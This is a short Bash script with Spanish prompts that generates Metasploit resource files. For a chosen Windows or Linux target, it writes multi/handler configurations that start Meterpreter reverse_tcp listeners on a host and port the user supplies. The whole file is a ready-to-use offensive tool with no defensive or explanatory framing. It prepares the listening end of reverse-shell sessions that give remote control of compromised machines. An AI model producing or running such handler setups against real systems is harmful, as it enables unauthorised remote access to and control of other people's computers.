#! /bin/bash
clear
echo "......................................."
echo ". Bienvenido al Generador de Handlers ."
echo "......................................."
echo ""
echo "Elija el Sistema Operativo:"
echo ""
echo "1- Windows."
echo "2- Linux."
echo "q- salir."
echo ""
read opcion

case $opcion in
1)
	clear
	echo "....................................."
	echo ". Generador de Handler para Windows ."
	echo "....................................."
	echo ""
	echo "--> Meterpreter x64"
	echo "--> Meterpreter x86"
	echo ""
	read -p "Identificador del handler: " name
	read -p "Host Local: " lhost
	read -p "Puerto Local: " lport

	#Meterpreter x64:
	echo "use exploit/multi/handler" > /hacking/handlers/hand-$name-x64.rc
	echo "set payload windows/x64/meterpreter/reverse_tcp" >> /hacking/handlers/hand-$name-x64.rc
	echo set lhost $lhost >> /hacking/handlers/hand-$name-x64.rc
	echo set lport $lport >> /hacking/handlers/hand-$name-x64.rc
	echo "exploit" >> /hacking/handlers/hand-$name-x64.rc

	#Meterpreter x86:
        echo "use exploit/multi/handler" > /hacking/handlers/hand-$name-x86.rc
        echo "set payload windows/meterpreter/reverse_tcp" >> /hacking/handlers/hand-$name-x86.rc
        echo set lhost $lhost >> /hacking/handlers/hand-$name-x86.rc
        echo set lport $lport >> /hacking/handlers/hand-$name-x86.rc
        echo "exploit" >> /hacking/handlers/hand-$name-x86.rc

	clear
	echo "......................................"
        echo ". Generador de Handlers para Windows ."
        echo "......................................"
        echo ""
	echo "Los Handlers han sido generados satisfactoriamente en el directorio: "
	echo "/hacking/handlers/"
	echo "Handler x64:  hand-"$name"-x64.rc"
	echo "Handler x86:  hand-"$name"-x86.rc"
	echo ""
	echo "Presione una tecla para salir.."
	read
	exit;;
	
2)
	
	
	clear
	echo "..................................."
	echo ". Generador de Handler para Linux ."
	echo "..................................."
	echo ""
	echo "--> Meterpreter x64"
	echo "--> Meterpreter x86"
	echo ""
	read -p "Identificador del handler: " name
	read -p "Host Local: " lhost
	read -p "Puerto Local: " lport

	#Meterpreter x64:
	echo "use exploit/multi/handler" > /hacking/handlers/hand-$name-x64linux.rc
	echo "set payload linux/x64/meterpreter/reverse_tcp" >> /hacking/handlers/hand-$name-x64linux.rc
	echo set lhost $lhost >> /hacking/handlers/hand-$name-x64linux.rc
	echo set lport $lport >> /hacking/handlers/hand-$name-x64linux.rc
	echo "exploit" >> /hacking/handlers/hand-$name-x64linux.rc

	#Meterpreter x86:
        echo "use exploit/multi/handler" > /hacking/handlers/hand-$name-x86linux.rc
        echo "set payload linux/x86/meterpreter/reverse_tcp" >> /hacking/handlers/hand-$name-x86linux.rc
        echo set lhost $lhost >> /hacking/handlers/hand-$name-x86linux.rc
        echo set lport $lport >> /hacking/handlers/hand-$name-x86linux.rc
        echo "exploit" >> /hacking/handlers/hand-$name-x86linux.rc

	clear
	echo "...................................."
        echo ". Generador de Handlers para Linux ."
        echo "...................................."
        echo ""
	echo "Los Handlers han sido generados satisfactoriamente en el directorio: "
	echo "/hacking/handlers/"
	echo "Handler x64:  hand-"$name"-x64linux.rc"
	echo "Handler x86:  hand-"$name"-x86linux.rc"
	echo ""
	echo "Presione una tecla para salir.."
	read
	exit;;

q|Q) exit;;
*)
echo "Hubo un error, reintente.";;
esac
